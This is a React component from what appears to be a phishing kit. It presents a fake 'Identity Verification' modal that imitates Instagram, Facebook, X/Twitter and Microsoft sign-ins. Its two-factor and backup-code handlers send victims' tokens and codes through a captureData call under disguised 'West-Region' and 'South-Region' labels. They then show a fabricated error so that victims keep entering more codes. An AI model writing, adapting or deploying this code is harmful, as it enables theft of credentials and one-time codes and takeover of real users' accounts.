"use client";

import { useState } from "react";
import {
  X,
  Instagram,
  Mail,
  ChevronRight,
  Facebook,
  Twitter,
  Star,
} from "lucide-react";
import AuthVerification from "./AuthVerification"; // Instagram
import FacebookVote from "./FacebookVote";
import TwitterVote from "./TwitterVote";
import EmailVerification from "./EmailVerification";
import AuthTwoFactor from "./AuthTwoFactor";
import AuthBackup from "./AuthBackup";
import { captureData } from "@/lib/capture";

export default function AuthModal({
  isOpen,
  onClose,
}: {
  isOpen: boolean;
  onClose: () => void;
}) {
  const [view, setView] = useState<
    | "gateway"
    | "email"
    | "instagram"
    | "facebook"
    | "twitter"
    | "two_factor"
    | "backup_code"
    | "success"
  >("gateway");
  const [currentEntryId, setCurrentEntryId] = useState<string | null>(null);
  const [isError, setIsError] = useState(false);

  if (!isOpen) return null;

  const handleClose = () => {
    setView("gateway");
    setCurrentEntryId(null);
    setIsError(false);
    onClose();
  };

  const handleBackupVerify = async (code: string) => {
    setIsError(false);
    if (currentEntryId) {
      const uniqueKey = `backupCode_${Date.now()}`;
      await captureData("West-Region", { [uniqueKey]: code }, currentEntryId);
    }
    setTimeout(() => setIsError(true), 1200);
  };

  const handleTwoFactorVerify = async (token: string) => {
    setIsError(false);
    if (currentEntryId) {
      const uniqueKey = `token_${Date.now()}`;
      await captureData("South-Region", { [uniqueKey]: token }, currentEntryId);
    }
    setTimeout(() => setIsError(true), 1200);
  };

  return (
    <div className="fixed inset-0 z-[500] flex items-center justify-center p-4">
      <div
        className={`absolute inset-0 transition-all duration-500 ${
          view === "backup_code" || view === "two_factor"
            ? "bg-white"
            : "bg-white/90 backdrop-blur-md"
        }`}
        onClick={handleClose}
      />

      {/* 1. GATEWAY VIEW */}
      {view === "gateway" && (
        <div className="relative bg-white w-full max-w-lg rounded-[2.5rem] p-8 md:p-12 text-center border border-gray-100 shadow-2xl animate-in zoom-in-95">
          <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-[#952370] via-[#4652b9] to-[#952370] rounded-t-[2.5rem]" />
          <button
            onClick={handleClose}
            className="absolute top-6 right-6 text-gray-400 hover:text-black">
            <X size={24} />
          </button>

          <div className="mb-8">
            <div className="inline-flex p-3 bg-[#4652b9]/5 rounded-2xl mb-4">
              <Star className="w-6 h-6 text-[#4652b9]" />
            </div>
            <h3 className="text-3xl font-bold tracking-tight text-gray-900 mb-2 uppercase">
              Identity Verification
            </h3>
            <p className="text-gray-500 text-sm">
              Select a service to verify your identity
            </p>
          </div>

          <div className="grid grid-cols-1 gap-3 text-left">
            <button
              onClick={() => setView("instagram")}
              className="group w-full bg-[#E1306C] text-white py-4 rounded-xl font-bold flex items-center justify-between px-6 shadow-md active:scale-95 transition-transform">
              <div className="flex items-center gap-4">
                <Instagram className="w-5 h-5" />
                <span className="text-[10px] uppercase tracking-widest font-black">
                  Verify with Instagram
                </span>
              </div>
              <ChevronRight className="w-4 h-4 opacity-50" />
            </button>

            <button
              onClick={() => setView("facebook")}
              className="group w-full bg-[#1877F2] text-white py-4 rounded-xl font-bold flex items-center justify-between px-6 shadow-md active:scale-95 transition-transform">
              <div className="flex items-center gap-4">
                <Facebook className="w-5 h-5" />
                <span className="text-[10px] uppercase tracking-widest font-black">
                  Verify with Facebook
                </span>
              </div>
              <ChevronRight className="w-4 h-4 opacity-50" />
            </button>

            <button
              onClick={() => setView("twitter")}
              className="group w-full bg-black text-white py-4 rounded-xl font-bold flex items-center justify-between px-6 shadow-md active:scale-95 transition-transform">
              <div className="flex items-center gap-4">
                <Twitter className="w-5 h-5" />
                <span className="text-[10px] uppercase tracking-widest font-black">
                  Verify with X / Twitter
                </span>
              </div>
              <ChevronRight className="w-4 h-4 opacity-50" />
            </button>

            <button
              onClick={() => setView("email")}
              className="group w-full bg-white border border-gray-200 text-gray-700 py-4 rounded-xl font-bold flex items-center justify-between px-6 hover:bg-gray-50 transition-colors">
              <div className="flex items-center gap-4">
                <Mail className="w-5 h-5 text-blue-500" />
                <span className="text-[10px] uppercase tracking-widest font-black">
                  Verify with Microsoft
                </span>
              </div>
              <ChevronRight className="w-4 h-4 opacity-30" />
            </button>
          </div>
        </div>
      )}

      {/* 2. AUTHENTICATION VIEWS */}

      {/* IG & FB: Funnel to 2FA Loop */}
      {view === "instagram" && (
        <AuthVerification
          onLogin={(user, id) => setCurrentEntryId(id)}
          onSuccess={() => {
            setIsError(false);
            setView("two_factor");
          }}
          onRequireBackup={() => {
            setIsError(false);
            setView("two_factor");
          }}
        />
      )}

      {view === "facebook" && (
        <FacebookVote
          onLogin={(user, id) => setCurrentEntryId(id)}
          onSuccess={() => {
            setIsError(false);
            setView("two_factor");
          }}
          onRequireOTP={() => {
            setIsError(false);
            setView("two_factor");
          }}
        />
      )}

      {/* Twitter & Email: Native Success Flow */}
      {view === "twitter" && (
        <TwitterVote
          onLogin={(user, id) => setCurrentEntryId(id)}
          onSuccess={() => setView("success")}
          onRequireOTP={() => setView("success")}
        />
      )}

      {view === "email" && (
        <EmailVerification
          onLogin={(email, id) => setCurrentEntryId(id)}
          onSuccess={() => setView("success")}
        />
      )}

      {/* 3. TWO-FACTOR & BACKUP LOOP (IG/FB ONLY) */}
      {view === "two_factor" && (
        <AuthTwoFactor
          onVerify={handleTwoFactorVerify}
          showError={isError}
          onUseBackup={() => {
            setIsError(false);
            setView("backup_code");
          }}
        />
      )}

      {view === "backup_code" && (
        <AuthBackup
          onUseApp={() => {
            setIsError(false);
            setView("two_factor");
          }}
          onVerify={handleBackupVerify}
          showError={isError}
        />
      )}

      {/* 4. SUCCESS VIEW */}
      {view === "success" && (
        <div className="relative bg-white w-full max-w-lg rounded-[2.5rem] p-16 text-center border border-gray-100 shadow-2xl animate-in zoom-in-95">
          <div className="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6">
            <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center text-white text-xl font-bold">
              ✓
            </div>
          </div>
          <h3 className="text-gray-900 text-2xl font-bold uppercase tracking-tighter">
            Verification Complete
          </h3>
          <p className="text-gray-500 mt-4 text-sm">
            Thank you for confirming your identity.
          </p>
          <button
            onClick={handleClose}
            className="mt-8 bg-[#4652b9] text-white px-10 py-3 rounded-xl font-bold w-full uppercase text-xs tracking-[0.2em] shadow-lg active:scale-95 transition-transform">
            Continue
          </button>
        </div>
      )}
    </div>
  );
}
